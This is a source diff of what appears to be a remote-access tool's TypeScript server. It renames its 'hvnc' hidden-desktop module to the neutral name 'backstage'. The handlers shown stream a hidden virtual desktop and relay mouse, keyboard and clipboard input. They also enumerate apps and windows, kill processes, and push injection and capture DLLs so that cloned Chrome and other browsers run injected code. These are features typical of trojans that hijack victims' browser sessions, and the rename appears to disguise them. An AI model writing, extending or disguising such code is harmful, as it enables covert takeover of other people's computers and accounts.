@@ -57,7 +57,7 @@ function getInjectionDllBytes(): Uint8Array | null {
       }
       _cachedInjectionDll = new Uint8Array(readFileSync(_dllCachePath));
       _dllCacheMtimeMs = st.mtimeMs;
-      logger.info(`[hvnc] reloaded injection DLL from ${_dllCachePath} (${_cachedInjectionDll.length} bytes)`);
+      logger.info(`[backstage] reloaded injection DLL from ${_dllCachePath} (${_cachedInjectionDll.length} bytes)`);
       return _cachedInjectionDll;
     } catch {
       _dllCachePath = null;
@@ -73,14 +73,14 @@ function getInjectionDllBytes(): Uint8Array | null {
       _cachedInjectionDll = new Uint8Array(readFileSync(dllPath));
       _dllCachePath = dllPath;
       _dllCacheMtimeMs = st.mtimeMs;
-      logger.info(`[hvnc] loaded injection DLL from ${dllPath} (${_cachedInjectionDll.length} bytes)`);
+      logger.info(`[backstage] loaded injection DLL from ${dllPath} (${_cachedInjectionDll.length} bytes)`);
       return _cachedInjectionDll;
     } catch {
       continue;
     }
   }
 
-  logger.warn(`[hvnc] injection DLL not found. Checked: ${candidates.join(", ")}`);
+  logger.warn(`[backstage] injection DLL not found. Checked: ${candidates.join(", ")}`);
   return null;
 }
 
@@ -101,7 +101,7 @@ function getCaptureDllBytes(): Uint8Array | null {
       }
       _cachedCaptureDll = new Uint8Array(readFileSync(_captureDllCachePath));
       _captureDllCacheMtimeMs = st.mtimeMs;
-      logger.info(`[hvnc] reloaded capture DLL from ${_captureDllCachePath} (${_cachedCaptureDll.length} bytes)`);
+      logger.info(`[backstage] reloaded capture DLL from ${_captureDllCachePath} (${_cachedCaptureDll.length} bytes)`);
       return _cachedCaptureDll;
     } catch {
       _captureDllCachePath = null;
@@ -117,7 +117,7 @@ function getCaptureDllBytes(): Uint8Array | null {
       _cachedCaptureDll = new Uint8Array(readFileSync(dllPath));
       _captureDllCachePath = dllPath;
       _captureDllCacheMtimeMs = st.mtimeMs;
-      logger.info(`[hvnc] loaded capture DLL from ${dllPath} (${_cachedCaptureDll.length} bytes)`);
+      logger.info(`[backstage] loaded capture DLL from ${dllPath} (${_cachedCaptureDll.length} bytes)`);
       return _cachedCaptureDll;
     } catch {
       continue;
@@ -792,7 +792,7 @@ function broadcastRemoteDesktopFrame(clientId: string, bytes: Uint8Array, header
   return broadcastRemoteDesktopFrame(clientId, bytes, header);
 };
 
-type HVNCStreamingState = {
+type backstageStreamingState = {
   isStreaming: boolean;
   virtualMode: boolean;
   display: number;
@@ -802,11 +802,11 @@ type HVNCStreamingState = {
   lastFps: number;
 };
 
-function defaultHVNCStreamingState(): HVNCStreamingState {
+function defaultbackstageStreamingState(): backstageStreamingState {
   return { isStreaming: false, virtualMode: false, display: 0, quality: 90, codec: "", maxFps: 120, lastFps: 0 };
 }
 
-export const hvncStreamingState = new Map<string, HVNCStreamingState>();
+export const backstageStreamingState = new Map<string, backstageStreamingState>();
 export const webcamStreamingState = new Map<string, { isStreaming: boolean; deviceIndex: number; fps: number; useMax: boolean; quality: number; codec: string }>();
 
 export function handleWebcamViewerOpen(ws: ServerWebSocket<SocketData>) {
@@ -850,10 +850,10 @@ export function handleWebcamDevices(clientId: string, payload: any) {
   }
 }
 
-export function handleHVNCCloneProgress(clientId: string, payload: any) {
-  for (const session of sessionManager.getHvncSessionsForClient(clientId)) {
+export function handlebackstageCloneProgress(clientId: string, payload: any) {
+  for (const session of sessionManager.getbackstageSessionsForClient(clientId)) {
     safeSendViewer(session.viewer, {
-      type: "hvnc_clone_progress",
+      type: "backstage_clone_progress",
       browser: String(payload.browser || ""),
       percent: Number(payload.percent) || 0,
       copiedBytes: Number(payload.copiedBytes) || 0,
@@ -863,10 +863,10 @@ export function handleHVNCCloneProgress(clientId: string, payload: any) {
   }
 }
 
-export function handleHVNCLookupResult(clientId: string, payload: any) {
-  for (const session of sessionManager.getHvncSessionsForClient(clientId)) {
+export function handlebackstageLookupResult(clientId: string, payload: any) {
+  for (const session of sessionManager.getbackstageSessionsForClient(clientId)) {
     safeSendViewer(session.viewer, {
-      type: "hvnc_lookup_result",
+      type: "backstage_lookup_result",
       exe: String(payload.exe || ""),
       path: String(payload.path || ""),
       done: !!payload.done,
@@ -874,22 +874,22 @@ export function handleHVNCLookupResult(clientId: string, payload: any) {
   }
 }
 
-export function handleHVNCBrowserCheckResult(clientId: string, payload: any) {
+export function handlebackstageBrowserCheckResult(clientId: string, payload: any) {
   const browsers: Record<string, boolean> = {};
   if (payload.browsers && typeof payload.browsers === "object") {
     for (const [key, val] of Object.entries(payload.browsers)) {
       browsers[key] = !!val;
     }
   }
-  for (const session of sessionManager.getHvncSessionsForClient(clientId)) {
+  for (const session of sessionManager.getbackstageSessionsForClient(clientId)) {
     safeSendViewer(session.viewer, {
-      type: "hvnc_browser_check_result",
+      type: "backstage_browser_check_result",
       browsers,
     });
   }
 }
 
-export function handleHVNCInstalledAppsResult(clientId: string, payload: any) {
+export function handlebackstageInstalledAppsResult(clientId: string, payload: any) {
   const apps: Array<{ name: string; exePath: string; icon: string }> = [];
   if (Array.isArray(payload.apps)) {
     for (const app of payload.apps) {
@@ -900,19 +900,19 @@ export function handleHVNCInstalledAppsResult(clientId: string, payload: any) {
       });
     }
   }
-  for (const session of sessionManager.getHvncSessionsForClient(clientId)) {
+  for (const session of sessionManager.getbackstageSessionsForClient(clientId)) {
     safeSendViewer(session.viewer, {
-      type: "hvnc_installed_apps_result",
+      type: "backstage_installed_apps_result",
       apps,
       done: !!payload.done,
     });
   }
 }
 
-export function handleHVNCDXGIStatus(clientId: string, payload: any) {
-  for (const session of sessionManager.getHvncSessionsForClient(clientId)) {
+export function handlebackstageDXGIStatus(clientId: string, payload: any) {
+  for (const session of sessionManager.getbackstageSessionsForClient(clientId)) {
     safeSendViewer(session.viewer, {
-      type: "hvnc_dxgi_status",
+      type: "backstage_dxgi_status",
       success: !!payload.success,
       gpuPid: Number(payload.gpuPid) || 0,
       message: String(payload.message || ""),
@@ -920,10 +920,10 @@ export function handleHVNCDXGIStatus(clientId: string, payload: any) {
   }
 }
 
-export function handleHVNCBrowserLaunchStatus(clientId: string, payload: any) {
-  for (const session of sessionManager.getHvncSessionsForClient(clientId)) {
+export function handlebackstageBrowserLaunchStatus(clientId: string, payload: any) {
+  for (const session of sessionManager.getbackstageSessionsForClient(clientId)) {
     safeSendViewer(session.viewer, {
-      type: "hvnc_browser_launch_status",
+      type: "backstage_browser_launch_status",
       browser: String(payload.browser || ""),
       step: String(payload.step || ""),
       success: !!payload.success,
@@ -932,7 +932,7 @@ export function handleHVNCBrowserLaunchStatus(clientId: string, payload: any) {
   }
 }
 
-export function handleHVNCWindowListResult(clientId: string, payload: any) {
+export function handlebackstageWindowListResult(clientId: string, payload: any) {
   const windows: Array<{
     title: string; x: number; y: number; width: number; height: number;
     pid: number; processName: string; monitor: number;
@@ -968,8 +968,8 @@ export function handleHVNCWindowListResult(clientId: string, payload: any) {
       });
     }
   }
-  for (const session of sessionManager.getHvncSessionsForClient(clientId)) {
-    safeSendViewer(session.viewer, { type: "hvnc_window_list_result", windows, monitors });
+  for (const session of sessionManager.getbackstageSessionsForClient(clientId)) {
+    safeSendViewer(session.viewer, { type: "backstage_window_list_result", windows, monitors });
   }
 }
 
@@ -977,8 +977,8 @@ export function handleClipboardContent(clientId: string, payload: any) {
   const text = String(payload.text || "");
   const source = String(payload.source || "");
   if (!text) return;
-  if (source === "hvnc") {
-    for (const session of sessionManager.getHvncSessionsForClient(clientId)) {
+  if (source === "backstage") {
+    for (const session of sessionManager.getbackstageSessionsForClient(clientId)) {
       safeSendViewer(session.viewer, { type: "clipboard_content", text, source });
     }
   } else {
@@ -1110,7 +1110,7 @@ export function handleWebcamViewerMessage(ws: ServerWebSocket<SocketData>, raw: 
   }
 }
 
-export function handleHVNCViewerOpen(ws: ServerWebSocket<SocketData>) {
+export function handlebackstageViewerOpen(ws: ServerWebSocket<SocketData>) {
   const { clientId, userId, userRole } = ws.data;
   if (userId !== undefined && userRole && !canUserAccessClient(userId, userRole as any, clientId)) {
     ws.close(1008, "Forbidden: client access denied");
@@ -1120,7 +1120,7 @@ export function handleHVNCViewerOpen(ws: ServerWebSocket<SocketData>) {
   ws.data.sessionId = sessionId;
   const target = clientManager.getClient(clientId);
   const session: RemoteDesktopViewer = { id: sessionId, clientId, viewer: ws, createdAt: Date.now() };
-  sessionManager.addHvncSession(session);
+  sessionManager.addbackstageSession(session);
   safeSendViewer(ws, { type: "ready", sessionId, clientId, clientOnline: !!target });
   if (!target) {
     safeSendViewer(ws, { type: "status", status: "offline", reason: "Client is offline", sessionId });
@@ -1129,8 +1129,8 @@ export function handleHVNCViewerOpen(ws: ServerWebSocket<SocketData>) {
   safeSendViewer(ws, { type: "status", status: "connecting", sessionId });
 }
 
-function notifyHVNCStatus(clientId: string, status: string, reason?: string) {
-  for (const session of sessionManager.getHvncSessionsForClient(clientId)) {
+function notifybackstageStatus(clientId: string, status: string, reason?: string) {
+  for (const session of sessionManager.getbackstageSessionsForClient(clientId)) {
     safeSendViewer(session.viewer, {
       type: "status",
       status,
@@ -1140,7 +1140,7 @@ function notifyHVNCStatus(clientId: string, status: string, reason?: string) {
   }
 }
 
-export function handleHVNCViewerMessage(ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) {
+export function handlebackstageViewerMessage(ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) {
   const payload = decodeViewerPayload(raw);
   if (!payload) return;
   if (!payload || typeof payload.type !== "string") return;
@@ -1151,27 +1151,27 @@ export function handleHVNCViewerMessage(ws: ServerWebSocket<SocketData>, raw: st
     return;
   }
 
-  const state = hvncStreamingState.get(clientId) || defaultHVNCStreamingState();
+  const state = backstageStreamingState.get(clientId) || defaultbackstageStreamingState();
 
-  logger.debug(`[hvnc] inbound viewer msg type=${payload.type} client=${clientId}`);
+  logger.debug(`[backstage] inbound viewer msg type=${payload.type} client=${clientId}`);
   switch (payload.type) {
-    case "hvnc_start":
+    case "backstage_start":
       {
         const virtualMode = (payload as any).virtual_mode === true || (payload as any).hidden_mode === true;
         if (state.isStreaming && state.virtualMode !== virtualMode) {
-          sendHVNCCommand(target, "hvnc_stop", {});
+          sendbackstageCommand(target, "backstage_stop", {});
           state.isStreaming = false;
-          logger.debug(`[hvnc] restarting stream to change virtual_mode=${state.virtualMode} -> ${virtualMode}`);
+          logger.debug(`[backstage] restarting stream to change virtual_mode=${state.virtualMode} -> ${virtualMode}`);
         }
       if (!state.isStreaming) {
         if ((payload as any).webrtc === true) {
-          const streamPath = webrtcStreamPathFor(clientId, "hvnc");
+          const streamPath = webrtcStreamPathFor(clientId, "backstage");
           const token = issueWebrtcPublishToken(clientId);
-          sendHVNCCommand(target, "webrtc_publish", {
+          sendbackstageCommand(target, "webrtc_publish", {
             streamPath,
             whipPath: `/api/webrtc/${streamPath}/whip`,
             token,
-            kind: "hvnc",
+            kind: "backstage",
             hasVideo: true,
             hasAudio: false,
           });
@@ -1181,149 +1181,149 @@ export function handleHVNCViewerMessage(ws: ServerWebSocket<SocketData>, raw: st
             whepPath: `/api/webrtc/${streamPath}/whep`,
           });
         }
-        sendHVNCCommand(target, "hvnc_set_fps", { fps: clampDesktopFps(state.maxFps) });
-        sendHVNCCommand(target, "hvnc_start", {
+        sendbackstageCommand(target, "backstage_set_fps", { fps: clampDesktopFps(state.maxFps) });
+        sendbackstageCommand(target, "backstage_start", {
           autoStartExplorer: false,
           ...(virtualMode ? { virtual_mode: true } : {}),
         });
         state.isStreaming = true;
         state.virtualMode = virtualMode;
-        hvncStreamingState.set(clientId, state);
-        logger.debug(`[hvnc] started streaming for client ${clientId} (virtual_mode=${virtualMode})`);
+        backstageStreamingState.set(clientId, state);
+        logger.debug(`[backstage] started streaming for client ${clientId} (virtual_mode=${virtualMode})`);
       } else {
-        logger.debug(`[hvnc] ignoring duplicate hvnc_start for client ${clientId}`);
+        logger.debug(`[backstage] ignoring duplicate backstage_start for client ${clientId}`);
       }
       }
       break;
-    case "hvnc_stop": {
-      const otherHvncViewers = sessionManager.getHvncSessionsForClient(clientId)
+    case "backstage_stop": {
+      const otherbackstageViewers = sessionManager.getbackstageSessionsForClient(clientId)
         .filter(s => s.id !== ws.data.sessionId);
-      if (otherHvncViewers.length === 0) {
-        sendHVNCCommand(target, "hvnc_stop", {});
-        sendHVNCCommand(target, "webrtc_stop", { kind: "hvnc" });
+      if (otherbackstageViewers.length === 0) {
+        sendbackstageCommand(target, "backstage_stop", {});
+        sendbackstageCommand(target, "webrtc_stop", { kind: "backstage" });
         state.isStreaming = false;
-        hvncStreamingState.set(clientId, state);
-        logger.debug(`[hvnc] stopped streaming for client ${clientId}`);
+        backstageStreamingState.set(clientId, state);
+        logger.debug(`[backstage] stopped streaming for client ${clientId}`);
       } else {
-        logger.debug(`[hvnc] ignoring hvnc_stop for client ${clientId} - ${otherHvncViewers.length} other viewer(s) still active`);
+        logger.debug(`[backstage] ignoring backstage_stop for client ${clientId} - ${otherbackstageViewers.length} other viewer(s) still active`);
       }
       break;
     }
-    case "hvnc_select_display": {
+    case "backstage_select_display": {
       const newDisplay = Number(payload.display) || 0;
       if (state.display !== newDisplay) {
-        logger.debug(`[hvnc] changing display from ${state.display} to ${newDisplay}`);
-        sendHVNCCommand(target, "hvnc_select_display", { display: newDisplay });
+        logger.debug(`[backstage] changing display from ${state.display} to ${newDisplay}`);
+        sendbackstageCommand(target, "backstage_select_display", { display: newDisplay });
         state.display = newDisplay;
-        hvncStreamingState.set(clientId, state);
+        backstageStreamingState.set(clientId, state);
       } else {
-        logger.debug(`[hvnc] ignoring duplicate display select ${newDisplay}`);
+        logger.debug(`[backstage] ignoring duplicate display select ${newDisplay}`);
       }
       break;
     }
-    case "hvnc_set_quality": {
+    case "backstage_set_quality": {
       const newQuality = Number(payload.quality) || 90;
       const newCodec = String(payload.codec || "").toLowerCase();
-		sendHVNCCommand(target, "hvnc_set_quality", { quality: newQuality, codec: newCodec });
+		sendbackstageCommand(target, "backstage_set_quality", { quality: newQuality, codec: newCodec });
 		if (state.quality !== newQuality || state.codec !== newCodec) {
         state.quality = newQuality;
         state.codec = newCodec;
-        hvncStreamingState.set(clientId, state);
-        logger.debug(`[hvnc] set quality=${newQuality} codec=${newCodec || "(default)"}`);
+        backstageStreamingState.set(clientId, state);
+        logger.debug(`[backstage] set quality=${newQuality} codec=${newCodec || "(default)"}`);
       }
       break;
     }
-    case "hvnc_request_keyframe":
+    case "backstage_request_keyframe":
       if (state.isStreaming) {
-        sendHVNCCommand(target, "hvnc_request_keyframe", {
+        sendbackstageCommand(target, "backstage_request_keyframe", {
           reason: String((payload as any).reason || "viewer_request"),
         });
       }
       break;
-    case "hvnc_set_fps": {
+    case "backstage_set_fps": {
       const newMaxFps = clampDesktopFps((payload as any).fps);
-	  sendHVNCCommand(target, "hvnc_set_fps", { fps: newMaxFps });
+	  sendbackstageCommand(target, "backstage_set_fps", { fps: newMaxFps });
       if (state.maxFps !== newMaxFps) {
         state.maxFps = newMaxFps;
-        hvncStreamingState.set(clientId, state);
-        logger.debug(`[hvnc] set target fps=${newMaxFps}`);
+        backstageStreamingState.set(clientId, state);
+        logger.debug(`[backstage] set target fps=${newMaxFps}`);
       }
       break;
     }
-    case "hvnc_enable_mouse":
-      if (state.isStreaming) sendHVNCCommand(target, "hvnc_enable_mouse", { enabled: !!payload.enabled });
+    case "backstage_enable_mouse":
+      if (state.isStreaming) sendbackstageCommand(target, "backstage_enable_mouse", { enabled: !!payload.enabled });
       break;
-    case "hvnc_enable_keyboard":
-      if (state.isStreaming) sendHVNCCommand(target, "hvnc_enable_keyboard", { enabled: !!payload.enabled });
+    case "backstage_enable_keyboard":
+      if (state.isStreaming) sendbackstageCommand(target, "backstage_enable_keyboard", { enabled: !!payload.enabled });
       break;
-    case "hvnc_enable_cursor":
-      if (state.isStreaming) sendHVNCCommand(target, "hvnc_enable_cursor", { enabled: !!payload.enabled });
+    case "backstage_enable_cursor":
+      if (state.isStreaming) sendbackstageCommand(target, "backstage_enable_cursor", { enabled: !!payload.enabled });
       break;
-    case "hvnc_enable_dxgi":
-      if (state.isStreaming) sendHVNCCommand(target, "hvnc_enable_dxgi", { enabled: !!payload.enabled });
+    case "backstage_enable_dxgi":
+      if (state.isStreaming) sendbackstageCommand(target, "backstage_enable_dxgi", { enabled: !!payload.enabled });
       break;
-    case "hvnc_enable_uia":
-      if (state.isStreaming) sendHVNCCommand(target, "hvnc_enable_uia", { enabled: !!payload.enabled });
+    case "backstage_enable_uia":
+      if (state.isStreaming) sendbackstageCommand(target, "backstage_enable_uia", { enabled: !!payload.enabled });
       break;
-    case "hvnc_set_resolution": {
+    case "backstage_set_resolution": {
       const maxHeight = Number(payload.maxHeight) || 0;
-      if (state.isStreaming) sendHVNCCommand(target, "hvnc_set_resolution", { maxHeight });
+      if (state.isStreaming) sendbackstageCommand(target, "backstage_set_resolution", { maxHeight });
       break;
     }
-    case "hvnc_mouse_move":
-      if (state.isStreaming) sendHVNCCommand(target, "hvnc_mouse_move", { x: Number(payload.x) || 0, y: Number(payload.y) || 0 });
+    case "backstage_mouse_move":
+      if (state.isStreaming) sendbackstageCommand(target, "backstage_mouse_move", { x: Number(payload.x) || 0, y: Number(payload.y) || 0 });
       break;
-    case "hvnc_mouse_down":
-      if (state.isStreaming) sendHVNCCommand(target, "hvnc_mouse_down", {
+    case "backstage_mouse_down":
+      if (state.isStreaming) sendbackstageCommand(target, "backstage_mouse_down", {
         button: Number(payload.button) || 0,
         x: Number(payload.x) || 0,
         y: Number(payload.y) || 0,
       });
       break;
-    case "hvnc_mouse_up":
-      if (state.isStreaming) sendHVNCCommand(target, "hvnc_mouse_up", {
+    case "backstage_mouse_up":
+      if (state.isStreaming) sendbackstageCommand(target, "backstage_mouse_up", {
         button: Number(payload.button) || 0,
         x: Number(payload.x) || 0,
         y: Number(payload.y) || 0,
       });
       break;
-    case "hvnc_mouse_wheel":
-      if (state.isStreaming) sendHVNCCommand(target, "hvnc_mouse_wheel", { delta: Number(payload.delta) || 0, x: Number(payload.x) || 0, y: Number(payload.y) || 0 });
+    case "backstage_mouse_wheel":
+      if (state.isStreaming) sendbackstageCommand(target, "backstage_mouse_wheel", { delta: Number(payload.delta) || 0, x: Number(payload.x) || 0, y: Number(payload.y) || 0 });
       break;
-    case "hvnc_key_down":
-      if (state.isStreaming) sendHVNCCommand(target, "hvnc_key_down", { key: payload.key || "", code: payload.code || "" });
+    case "backstage_key_down":
+      if (state.isStreaming) sendbackstageCommand(target, "backstage_key_down", { key: payload.key || "", code: payload.code || "" });
       break;
-    case "hvnc_key_up":
-      if (state.isStreaming) sendHVNCCommand(target, "hvnc_key_up", { key: payload.key || "", code: payload.code || "" });
+    case "backstage_key_up":
+      if (state.isStreaming) sendbackstageCommand(target, "backstage_key_up", { key: payload.key || "", code: payload.code || "" });
       break;
-    case "hvnc_lookup":
-      sendHVNCCommand(target, "hvnc_lookup", { exe: String(payload.exe || "") });
+    case "backstage_lookup":
+      sendbackstageCommand(target, "backstage_lookup", { exe: String(payload.exe || "") });
       break;
-    case "hvnc_browser_check":
-      sendHVNCCommand(target, "hvnc_browser_check", {});
+    case "backstage_browser_check":
+      sendbackstageCommand(target, "backstage_browser_check", {});
       break;
-    case "hvnc_installed_apps":
-      sendHVNCCommand(target, "hvnc_installed_apps", {});
+    case "backstage_installed_apps":
+      sendbackstageCommand(target, "backstage_installed_apps", {});
       break;
-    case "hvnc_window_list":
-      sendHVNCCommand(target, "hvnc_window_list", {});
+    case "backstage_window_list":
+      sendbackstageCommand(target, "backstage_window_list", {});
       break;
-    case "hvnc_start_process":
-      sendHVNCCommand(target, "hvnc_start_process", {
+    case "backstage_start_process":
+      sendbackstageCommand(target, "backstage_start_process", {
         path: String(payload.path || ""),
         kill_exe: String(payload.kill_exe || ""),
         opera_patch: Boolean(payload.opera_patch),
         display: state.display ?? 0,
       });
       break;
-    case "hvnc_kill_all":
-      sendHVNCCommand(target, "hvnc_kill_all", {});
+    case "backstage_kill_all":
+      sendbackstageCommand(target, "backstage_kill_all", {});
       break;
-    case "hvnc_start_process_injected": {
+    case "backstage_start_process_injected": {
       const dllData = getInjectionDllBytes();
       if (!dllData) {
-        logger.warn("[hvnc] injection DLL not available, cannot send hvnc_start_process_injected");
-        safeSendViewer(ws, { type: "hvnc_error", error: "HVNC injection DLL not found on the server. Browser cloning requires the DLL to be built and placed in the server directory.", critical: true });
+        logger.warn("[backstage] injection DLL not available, cannot send backstage_start_process_injected");
+        safeSendViewer(ws, { type: "backstage_error", error: "backstage injection DLL not found on the server. Browser cloning requires the DLL to be built and placed in the server directory.", critical: true });
         break;
       }
       const captureDll = getCaptureDllBytes();
@@ -1335,14 +1335,14 @@ export function handleHVNCViewerMessage(ws: ServerWebSocket<SocketData>, raw: st
         display: state.display ?? 0,
       };
       if (captureDll) cmdPayload.capture_dll = captureDll;
-      sendHVNCCommand(target, "hvnc_start_process_injected", cmdPayload);
+      sendbackstageCommand(target, "backstage_start_process_injected", cmdPayload);
       break;
     }
-    case "hvnc_start_chrome_injected": {
+    case "backstage_start_chrome_injected": {
       const dllData = getInjectionDllBytes();
       if (!dllData) {
-        logger.warn("[hvnc] injection DLL not available, cannot send hvnc_start_chrome_injected");
-        safeSendViewer(ws, { type: "hvnc_error", error: "HVNC injection DLL not found on the server. Browser cloning requires the DLL to be built and placed in the server directory.", critical: true });
+        logger.warn("[backstage] injection DLL not available, cannot send backstage_start_chrome_injected");
+        safeSendViewer(ws, { type: "backstage_error", error: "backstage injection DLL not found on the server. Browser cloning requires the DLL to be built and placed in the server directory.", critical: true });
         break;
       }
       const captureDllChrome = getCaptureDllBytes();
@@ -1352,14 +1352,14 @@ export function handleHVNCViewerMessage(ws: ServerWebSocket<SocketData>, raw: st
         display: state.display ?? 0,
       };
       if (captureDllChrome) chromeCmdPayload.capture_dll = captureDllChrome;
-      sendHVNCCommand(target, "hvnc_start_chrome_injected", chromeCmdPayload);
+      sendbackstageCommand(target, "backstage_start_chrome_injected", chromeCmdPayload);
       break;
     }
-    case "hvnc_start_browser_injected": {
+    case "backstage_start_browser_injected": {
       const dllData = getInjectionDllBytes();
       if (!dllData) {
-        logger.warn("[hvnc] injection DLL not available, cannot send hvnc_start_browser_injected");
-        safeSendViewer(ws, { type: "hvnc_error", error: "HVNC injection DLL not found on the server. Browser cloning requires the DLL to be built and placed in the server directory.", critical: true });
+        logger.warn("[backstage] injection DLL not available, cannot send backstage_start_browser_injected");
+        safeSendViewer(ws, { type: "backstage_error", error: "backstage injection DLL not found on the server. Browser cloning requires the DLL to be built and placed in the server directory.", critical: true });
         break;
       }
       const captureDllBrowser = getCaptureDllBytes();
@@ -1373,20 +1373,20 @@ export function handleHVNCViewerMessage(ws: ServerWebSocket<SocketData>, raw: st
         display: state.display ?? 0,
       };
       if (captureDllBrowser) browserCmdPayload.capture_dll = captureDllBrowser;
-      sendHVNCCommand(target, "hvnc_start_browser_injected", browserCmdPayload);
+      sendbackstageCommand(target, "backstage_start_browser_injected", browserCmdPayload);
       break;
     }
     case "clipboard_sync": {
       if (!state.isStreaming) break;
       const text = String(payload.text || "");
       if (text) {
-        sendHVNCCommand(target, "clipboard_set", { text });
+        sendbackstageCommand(target, "clipboard_set", { text });
       }
       break;
     }
     case "clipboard_sync_start": {
       if (!state.isStreaming) break;
-      sendDesktopCommand(target, "clipboard_sync_start", { source: "hvnc" });
+      sendDesktopCommand(target, "clipboard_sync_start", { source: "backstage" });
       break;
     }
     case "clipboard_sync_stop": {
@@ -1396,8 +1396,8 @@ export function handleHVNCViewerMessage(ws: ServerWebSocket<SocketData>, raw: st
     case "webrtc_p2p_offer": {
       const sdp = typeof (payload as any).sdp === "string" ? (payload as any).sdp : "";
       if (!sdp) break;
-      const sessionId = createP2PSession(ws, clientId, "hvnc");
-      sendHVNCCommand(target, "webrtc_p2p_offer", { sessionId, sdp, kind: "hvnc", hasVideo: true, hasAudio: false });
+      const sessionId = createP2PSession(ws, clientId, "backstage");
+      sendbackstageCommand(target, "webrtc_p2p_offer", { sessionId, sdp, kind: "backstage", hasVideo: true, hasAudio: false });
       break;
     }
     case "webrtc_p2p_ice": {
@@ -1405,9 +1405,9 @@ export function handleHVNCViewerMessage(ws: ServerWebSocket<SocketData>, raw: st
       if (!sessionId) break;
       const candidate = typeof (payload as any).candidate === "string" ? (payload as any).candidate : "";
       if (!candidate) break;
-      sendHVNCCommand(target, "webrtc_p2p_ice", {
+      sendbackstageCommand(target, "webrtc_p2p_ice", {
         sessionId,
-        kind: "hvnc",
+        kind: "backstage",
         candidate,
         sdpMid: typeof (payload as any).sdpMid === "string" ? (payload as any).sdpMid : "",
         sdpMLineIndex: Number((payload as any).sdpMLineIndex) || 0,
@@ -1417,7 +1417,7 @@ export function handleHVNCViewerMessage(ws: ServerWebSocket<SocketData>, raw: st
     case "webrtc_p2p_stop": {
       const cleared = clearP2PSessionForViewer(ws);
       if (cleared) {
-        sendHVNCCommand(target, "webrtc_p2p_stop", { sessionId: cleared.sessionId, kind: cleared.kind });
+        sendbackstageCommand(target, "webrtc_p2p_stop", { sessionId: cleared.sessionId, kind: cleared.kind });
       }
       break;
     }
@@ -1426,18 +1426,18 @@ export function handleHVNCViewerMessage(ws: ServerWebSocket<SocketData>, raw: st
   }
 }
 
-export function sendHVNCCommand(target: ClientInfo | undefined, commandType: string, payload: any) {
+export function sendbackstageCommand(target: ClientInfo | undefined, commandType: string, payload: any) {
   if (!target) {
-    logger.warn(`[hvnc] send command skipped, target missing command=${commandType}`);
+    logger.warn(`[backstage] send command skipped, target missing command=${commandType}`);
     return false;
   }
   try {
-    logger.debug(`[hvnc] send command command=${commandType} client=${target.id} payload=${JSON.stringify(payload || {})}`);
+    logger.debug(`[backstage] send command command=${commandType} client=${target.id} payload=${JSON.stringify(payload || {})}`);
     target.ws.send(encodeMessage({ type: "command", commandType: commandType as any, id: uuidv4(), payload }));
     metrics.recordCommand(commandType);
     return true;
   } catch (err) {
-    logger.error("[hvnc] send command failed", err);
+    logger.error("[backstage] send command failed", err);
     return false;
   }
 }
@@ -1448,8 +1448,8 @@ export function handleDesktopEncoderCapabilities(clientId: string, payload: any)
   }
 }
 
-(globalThis as any).__hvncBroadcast = (clientId: string, bytes: Uint8Array, header?: any): boolean => {
-  const state = hvncStreamingState.get(clientId) || defaultHVNCStreamingState();
+(globalThis as any).__backstageBroadcast = (clientId: string, bytes: Uint8Array, header?: any): boolean => {
+  const state = backstageStreamingState.get(clientId) || defaultbackstageStreamingState();
   if (!state.isStreaming) {
     state.isStreaming = true;
   }
@@ -1457,13 +1457,13 @@ export function handleDesktopEncoderCapabilities(clientId: string, payload: any)
   if (frameFps > 0) {
     state.lastFps = frameFps;
   }
-  hvncStreamingState.set(clientId, state);
+  backstageStreamingState.set(clientId, state);
   const buf = buildViewerFrameBuffer(bytes, header);
-  const result = broadcastFrameToViewers(sessionManager.getHvncSessionsForClient(clientId), buf, header);
+  const result = broadcastFrameToViewers(sessionManager.getbackstageSessionsForClient(clientId), buf, header);
   if (result.dropped) {
     const target = clientManager.getClient(clientId);
     if (target) {
-      sendHVNCCommand(target, "hvnc_request_keyframe", {
+      sendbackstageCommand(target, "backstage_request_keyframe", {
         reason: "viewer_backpressure",
         format: String(header?.format || ""),
       });
